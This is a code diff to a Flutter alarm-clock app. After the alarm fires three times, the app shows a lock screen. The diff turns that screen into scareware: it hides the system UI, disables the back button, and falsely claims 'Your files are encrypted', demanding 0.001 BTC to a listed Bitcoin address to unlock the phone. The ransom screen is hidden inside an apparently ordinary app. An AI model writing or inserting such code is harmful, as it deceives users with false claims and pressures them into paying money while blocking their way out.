@@ -1,8 +1,8 @@
 import 'dart:math';
 import 'package:flutter/material.dart';
 import 'package:audioplayers/audioplayers.dart';
+import 'package:flutter/services.dart';
 
-/// Tracks how many times the alarm has triggered.
 int _alarmTriggerCount = 0;
 bool get _isLocked => _alarmTriggerCount >= 3;
 
@@ -35,11 +35,10 @@ class _AlarmPageState extends State<AlarmPage> {
   @override
   void initState() {
     super.initState();
-    // If we are not locked yet, increment the alarm count.
+    // If not locked yet, increment alarm count.
     if (!_isLocked) {
       _alarmTriggered();
     }
-    // Pick a random funny message.
     motivationalMessage = messages[Random().nextInt(messages.length)];
     playAlarm();
   }
@@ -56,11 +55,9 @@ class _AlarmPageState extends State<AlarmPage> {
 
   @override
   Widget build(BuildContext context) {
-    // If locked, show the locked overlay.
     if (_isLocked) {
       return const LockedScreen();
     }
-    // Otherwise, show normal alarm screen.
     return Scaffold(
       backgroundColor: Colors.redAccent,
       body: Center(
@@ -112,11 +109,31 @@ class _LockedScreenState extends State<LockedScreen> {
   int tapCount = 0;
   DateTime? firstTapTime;
 
+  @override
+  void initState() {
+    super.initState();
+    // Hide system UI to simulate a "lock".
+    SystemChrome.setEnabledSystemUIMode(SystemUiMode.immersiveSticky);
+  }
+
+  @override
+  void dispose() {
+    // Restore system UI when leaving.
+    SystemChrome.setEnabledSystemUIMode(SystemUiMode.edgeToEdge);
+    super.dispose();
+  }
+
+  /// Disable the back button using WillPopScope.
+  Future<bool> _onWillPop() async {
+    // Return false to prevent normal navigation.
+    return false;
+  }
+
   void _handleTap() {
     final now = DateTime.now();
+    // If more than 2 seconds pass between taps, reset the counter.
     if (firstTapTime == null ||
         now.difference(firstTapTime!) > const Duration(seconds: 2)) {
-      // Reset if more than 2 seconds pass between taps.
       firstTapTime = now;
       tapCount = 1;
     } else {
@@ -131,42 +148,60 @@ class _LockedScreenState extends State<LockedScreen> {
 
   @override
   Widget build(BuildContext context) {
-    return Scaffold(
-      // Cover entire screen, preventing normal exit.
-      backgroundColor: Colors.black,
-      body: GestureDetector(
-        onTap: _handleTap,
-        behavior: HitTestBehavior.opaque,
-        child: Center(
-          child: Column(
-            mainAxisAlignment: MainAxisAlignment.center,
-            children: const [
-              Text(
-                'LOCKED',
-                style: TextStyle(
-                  fontSize: 48,
-                  fontWeight: FontWeight.bold,
-                  color: Colors.red,
+    return WillPopScope(
+      onWillPop: _onWillPop,
+      child: Scaffold(
+        backgroundColor: Colors.black,
+        body: GestureDetector(
+          onTap: _handleTap,
+          behavior: HitTestBehavior.opaque,
+          child: Center(
+            child: Column(
+              mainAxisAlignment: MainAxisAlignment.center,
+              children: const [
+                Text(
+                  'PHONE LOCKED',
+                  style: TextStyle(
+                    fontSize: 35,
+                    fontWeight: FontWeight.bold,
+                    color: Colors.red,
+                  ),
                 ),
-              ),
-              SizedBox(height: 20),
-              Text(
-                'Pay 0.001 BTC to unlock!',
-                style: TextStyle(
-                  fontSize: 24,
-                  fontStyle: FontStyle.italic,
-                  color: Colors.white,
+                Text(
+                  'Your files are encrypted',
+                  style: TextStyle(
+                    fontSize: 25,
+                    fontWeight: FontWeight.bold,
+                    color: Colors.red,
+                  ),
                 ),
-              ),
-              SizedBox(height: 20),
-              Text(
+                SizedBox(height: 20),
+                Text(
+                  'Pay 0.001 BTC to the following\n address to unlock your phone',
+                  style: TextStyle(
+                    fontSize: 24,
+                    fontStyle: FontStyle.italic,
+                    color: Colors.white,
+                  ),
+                ),
+                SizedBox(height: 20),
+                Text(
+                  'Address:',
+                  style: TextStyle(
+                    fontSize: 16,
+                    color: Colors.white70,
+                  ),
+                ),
+                SizedBox(height: 20),
+                Text(
                 '3KXaSnjicY9gMfjMvbUkefw1Tz1MkPcRAr',
                 style: TextStyle(
-                  fontSize: 16,
-                  color: Colors.white70,
+                fontSize: 16,
+                color: Colors.white70,
                 ),
-              ),
-            ],
+                ),
+              ],
+            ),
           ),
         ),
       ),
